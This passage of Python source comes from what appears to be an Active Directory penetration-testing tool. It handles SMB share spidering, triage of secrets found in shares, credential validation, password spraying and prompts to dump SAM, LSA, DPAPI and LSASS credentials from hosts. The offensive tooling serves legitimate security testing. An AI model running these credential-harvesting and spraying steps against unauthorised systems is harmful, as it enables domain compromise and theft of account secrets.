    seen_spray_candidates: set[str] = set()
    for finding in findings:
        username = str(getattr(finding, "username", "") or "").strip()
        secret = str(getattr(finding, "secret", "") or "").strip()
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        if not secret or secret == "-":
            continue
        if username and username != "-":
            key = (username, secret)
            if key not in seen_credential_candidates:
                credential_candidates.append((cred_type, username, secret))
                seen_credential_candidates.add(key)
            continue
        if callable(getattr(shell, "is_hash", None)) and shell.is_hash(secret):
            continue
        if secret not in seen_spray_candidates:
            spray_candidates.append(secret)
            seen_spray_candidates.add(secret)

    if credential_candidates:
        action_options = [
            "Validate and store all username+credential findings",
            "Validate and store one selected finding",
            "Skip validation for now",
        ]
        selected_action = _select_action_index(
            shell=shell,
            title="Choose how to handle discovered credentials:",
            options=action_options,
            default_idx=0,
        )
        if selected_action is None:
            selected_action = 2
        selected_rows = credential_candidates
        if selected_action == 1:
            row_options = [
                f"{username} ({cred_type})"
                for cred_type, username, _ in credential_candidates
            ]
            selected_row = _select_action_index(
                shell=shell,
                title="Select one finding to validate and store:",
                options=row_options,
                default_idx=0,
            )
            if selected_row is None:
                selected_rows = []
            else:
                selected_rows = [credential_candidates[selected_row]]
        elif selected_action == 2:
            selected_rows = []

        for cred_type, username, secret in selected_rows:
            marked_user = mark_sensitive(username, "user")
            marked_type = mark_sensitive(cred_type, "text")
            print_info(
                f"Validating/storing discovered credential for {marked_user} "
                f"(type={marked_type})."
            )
            source_steps = []
            if provenance_service is not None:
                source_steps = provenance_service.build_credential_source_steps(
                    relation="PasswordInShare",
                    edge_type="share_password",
                    source="share_ai_triage",
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.add_credential(
                    domain,
                    username,
                    secret,
                    source_steps=source_steps,
                    prompt_for_user_privs_after=False,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning(
                    "Could not validate/store one discovered credential. "
                    "Continuing with remaining findings."
                )
                print_exception(exception=exc)

    if spray_candidates and domain in getattr(shell, "domains", []):
        spray_secret = spray_candidates[0]
        if len(spray_candidates) > 1:
            idx = _select_action_index(
                shell=shell,
                title="Select one secret to use for password spraying:",
                options=[_safe_secret_preview(value) for value in spray_candidates],
                default_idx=0,
            )
            if idx is not None:
                spray_secret = spray_candidates[idx]
        if Confirm.ask(
            "Run password spraying using selected secret without associated username?",
            default=False,
        ):
            source_context = None
            if provenance_service is not None:
                source_context = provenance_service.build_source_context(
                    hosts=[host] if host else None,
                    shares=[share] if share else None,
                    artifact=path or None,
                    auth_username=auth_username,
                    origin="share_spidering",
                )
            try:
                shell.spraying_with_password(
                    domain,
                    spray_secret,
                    source_context=source_context,
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
                print_warning("Password spraying from discovered secret failed.")
                print_exception(exception=exc)
    return True


def _select_action_index(
    *,
    shell: Any,
    title: str,
    options: list[str],
    default_idx: int = 0,
) -> int | None:
    """Select one option with questionary helper when available."""
    if not options:
        return None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        try:
            return selector(title, options, default_idx)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "Questionary selector failed in prioritized findings action flow."
            )
    return default_idx


def _safe_secret_preview(value: str) -> str:
    """Return a masked preview string for interactive secret selection."""
    text = str(value or "").strip()
    if not text:
        return "-"
    preview = text if len(text) <= 8 else f"{text[:4]}...{text[-4:]}"
    return str(mark_sensitive(preview, "password"))


def _resolve_ai_zip_full_read_max_bytes() -> int:
    """Resolve safety cap for full ZIP reads in deterministic analysis."""
    raw = os.getenv("ADSCAN_AI_ZIP_FULL_READ_MAX_BYTES", "104857600").strip()
    try:
        value = int(raw)
    except ValueError:
        return 104857600
    return max(10 * 1024 * 1024, min(value, 512 * 1024 * 1024))


def _is_zip_path(path: str) -> bool:
    """Return true when a path appears to reference a ZIP archive."""
    return str(path or "").strip().lower().endswith(".zip")


def _render_ai_oversized_skips_table(
    *,
    rows: list[tuple[str, str, str, str, str]],
) -> None:
    """Render skipped oversized prioritized files in a compact table."""
    table = Table(
        title="[bold yellow]Skipped Oversized Prioritized Files[/bold yellow]",
        header_style="bold yellow",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Size", style="green")
    table.add_column("Limit", style="red")

    for host, share, path, size_text, limit_text in rows:
        table.add_row(
            mark_sensitive(host, "hostname"),
            mark_sensitive(share, "service"),
            mark_sensitive(path, "path"),
            size_text,
            limit_text,
        )
    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _format_size_human(num_bytes: int) -> str:
    """Format byte sizes into human-readable values for UX messages."""
    value = float(max(0, num_bytes))
    units = ["B", "KB", "MB", "GB", "TB"]
    unit_idx = 0
    while value >= 1024 and unit_idx < len(units) - 1:
        value /= 1024
        unit_idx += 1
    if unit_idx == 0:
        return f"{int(value)} {units[unit_idx]}"
    return f"{value:.2f} {units[unit_idx]}"


def _select_post_mapping_ai_scope(shell: Any) -> str | None:
    """Select triage scope after share mapping based on pentest type."""
    pentest_type = str(getattr(shell, "type", "") or "").strip().lower()
    if pentest_type == "ctf":
        return "credentials"

    options = [
        "Credentials only (default)",
        "Sensitive data only",
        "Credentials + sensitive data",
        "Skip AI triage",
    ]
    selected_idx: int | None = None
    selector = getattr(shell, "_questionary_select", None)
    if callable(selector):
        selected_idx = selector("AI triage scope:", options, default_idx=0)
    if selected_idx is None:
        # Cancelled selection or unavailable selector defaults to credentials-only.
        return "credentials"

    if selected_idx == 1:
        return "sensitive_data"
    if selected_idx == 2:
        return "both"
    if selected_idx == 3:
        return None
    return "credentials"


def ask_for_smb_descriptions(shell: Any, *, domain: str) -> None:
    """Prompt user to search for passwords in SMB user descriptions.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in [
        "auth",
        "pwned",
    ]:
        return

    if shell.auto:
        run_smb_descriptions(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        username = shell.domains_data.get(domain, {}).get("username", "N/A")

        if confirm_operation(
            operation_name="SMB Description Password Search",
            description="Scans user description fields via SMB for exposed passwords",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": username,
                "Protocol": "SMB/445",
                "Target Field": "User descriptions",
            },
            default=True,
            icon="🔎",
        ):
            run_smb_descriptions(shell, domain=domain)


def ask_for_smb_enum_users(shell: Any, *, domain: str) -> None:
    """Prompt user to enumerate domain users via SMB.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.auto:
        shell.do_netexec_smb_null_enum_users(domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[domain]["auth"]
        session_type_display = {
            "unauth": "Null Session (Unauthenticated)",
            "auth": "Authenticated Session",
            "pwned": "Administrative Session",
            "with_users": "With Users",
        }.get(auth_type, auth_type.capitalize())

        if confirm_operation(
            operation_name="SMB User Enumeration",
            description="Enumerates domain user accounts through SMB protocol",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Session Type": session_type_display,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="👥",
        ):
            shell.do_netexec_smb_null_enum_users(domain)


def run_ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Prompt user to perform unauthenticated SMB service scan.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell._is_ctf_domain_pwned(domain):
        return

    if shell.auto:
        run_smb_scan(shell, domain=domain)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

        if confirm_operation(
            operation_name="Unauthenticated SMB Scan",
            description="Performs null session, RID cycling, guest session, and shares enumeration",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Protocol": "SMB/445",
            },
            default=True,
            icon="🔒",
        ):
            run_smb_scan(shell, domain=domain)


def ask_for_smb_scan(shell: Any, *, domain: str) -> None:
    """Alias for run_ask_for_smb_scan for backward compatibility."""
    return run_ask_for_smb_scan(shell, domain=domain)


def run_netexec_auth_shares_from_args(shell: Any, args: str) -> None:
    """Execute authenticated SMB share enumeration from command-line arguments.

    Args:
        shell: Shell instance with domain data and helper methods.
        args: Space-separated string containing domain, username, and password.

    Usage:
        run_netexec_auth_shares_from_args(shell, "example.local admin Passw0rd!")
    """
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return
    args_list = args.split()
    if len(args_list) != 3:
        print_error("Usage: netexec_shares <domain> <username> <password>")
        return
    target_domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_auth_shares(
        shell,
        domain=target_domain,
        username=username,
        password=password,
    )


def ask_for_smb_access(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump credentials from host via SMB.

    Args:
        shell: Shell instance with domain data and helper methods.
        domain: Domain name.
        host: Target hostname or IP address.
        username: Username for authentication.
        password: Password for authentication.
    """
    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    respuesta = Confirm.ask(
        f"Do you want to dump credentials from host {marked_host} via SMB as user {marked_username}?"
    )
    if respuesta:
        shell.dump_sam(domain, username, password, host, "false")
        shell.dump_lsa(domain, username, password, host, "false")
        shell.dump_dpapi(domain, username, password, host, "false")
        shell.ask_for_dump_lsass(domain, username, password, host, "false")


def execute_manspider(
    shell: Any,
    *,
    command: str,
    domain: str,
    scan_type: str,
    hosts: list[str] | None = None,
    shares: list[str] | None = None,
    auth_username: str | None = None,
) -> None:
    """Execute manspider command and process its output based on type.

    For type 'passw' it displays the output directly and saves a log,
    for other types it processes the found files.

    Args:
        shell: Shell instance with domain data and helper methods.
        command: Full manspider command to execute.
        domain: Target domain name.
        scan_type: Type of scan - 'passw', 'ext', or 'gpp'.
    """
    try:
        if hosts or shares:
            marked_hosts = [mark_sensitive(h, "hostname") for h in (hosts or [])]
            marked_shares = [mark_sensitive(s, "path") for s in (shares or [])]
            print_info_debug(
                "Manspider context: "
                f"hosts={marked_hosts or 'N/A'} shares={marked_shares or 'N/A'}"
            )
        if scan_type == "passw":
            log_dir = "smb"
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)

            log_file = os.path.join(log_dir, "spidering_passw.log")

            completed_process = shell.run_command(command)
            if completed_process is None:
                print_error(
                    "manspider scan failed before returning any output while searching for possible passwords in shares."
                )
                return

            output_str = completed_process.stdout
            if output_str:
                with open(log_file, "w", encoding="utf-8") as log:
                    for line in output_str.splitlines():
                        line_stripped = line.strip()
                        if line_stripped:
                            clean_line = strip_ansi_codes(line_stripped)
                            log.write(clean_line + "\n")
                    log.flush()
                print_info_verbose(f"Log saved in {log_file}")
            else:
                print_warning_debug(
                    "Manspider command for type 'passw' produced no output."
                )

            if completed_process.returncode != 0:
                print_error_debug(
                    f"Error executing manspider (type passw). Return code: {completed_process.returncode}"
                )
                error_message = completed_process.stderr
                if error_message:
                    print_error(f"Details: {error_message}")
                elif not error_message and output_str:
                    print_error(f"Details (from stdout): {output_str}")
                else:
                    print_error_debug("No error output from manspider command.")

            # Analyze log to extract credentials if manspider completed successfully
            if (
                completed_process.returncode == 0
                and output_str
                and os.path.exists(log_file)
            ):
                credentials = shell.analyze_log_with_credsweeper(log_file)
                if credentials:
                    shell.handle_found_credentials(
                        credentials,
                        domain,
                        source_hosts=hosts,
                        source_shares=shares,
                        auth_username=auth_username,
                        source_artifact=log_file,
                    )
                    shell.update_report_field(domain, "smb_share_secrets", True)
                else:
                    current_report = (
                        shell.report.get(domain, {})
                        .get("vulnerabilities", {})
                        .get("smb_share_secrets")
                        if getattr(shell, "report", None)
                        else None
                    )
                    if current_report in (None, "NS", False):
                        shell.update_report_field(domain, "smb_share_secrets", False)

        else:
            # For other types, maintain original behavior
            proc = shell.run_command(command)
            if proc is None:
                print_error(
                    "manspider scan failed before returning any output while searching for files in shares."
                )
                return

            if proc.returncode == 0:
                output_directory = "smb/spidering"
                files_found = []

                # Collect all found files
                for filename in os.listdir(output_directory):
                    if filename.endswith(".json"):
                        continue
                    file_path = os.path.join(output_directory, filename)
                    if os.path.isfile(file_path):
                        files_found.append((filename, file_path))

                if not files_found:
                    print_error("No files found")
                    return

                print_warning("Files found:")
                for filename, _ in files_found:
                    shell.console.print(f"- {filename}")

                if scan_type == "gpp":
                    # For GPP files, process all automatically
                    for filename, file_path in files_found:
                        shell.process_found_file(
                            file_path,
                            domain,
                            scan_type,
                            source_hosts=hosts,
                            source_shares=shares,
                            auth_username=auth_username,
                        )
                else:
                    # For other types, ask for each file
                    print_info_verbose("Starting analysis process...")
                    for filename, file_path in files_found:
                        respuesta = Confirm.ask(
                            f"Do you want to process the file {filename}?"
                        )
                        if respuesta:
                            print_info_verbose(f"Processing {filename}...")
                            shell.process_found_file(
                                file_path,
                                domain,
                                scan_type,
                                source_hosts=hosts,
                                source_shares=shares,
                                auth_username=auth_username,
                            )
                        else:
                            print_info(f"Skipping {filename}")
            else:
                print_error("Error executing manspider to search for files")
                print_error(f"Error: {proc.stderr.strip()}")

    except Exception as e:
        telemetry.capture_exception(e)

        error_msg = str(e) if e else "Unknown error"
        error_type = type(e).__name__ if e else "Unknown"
        print_error(f"Error executing manspider: {error_msg}")
        print_error(f"Error type: {error_type}")
        print_exception(exception=e)
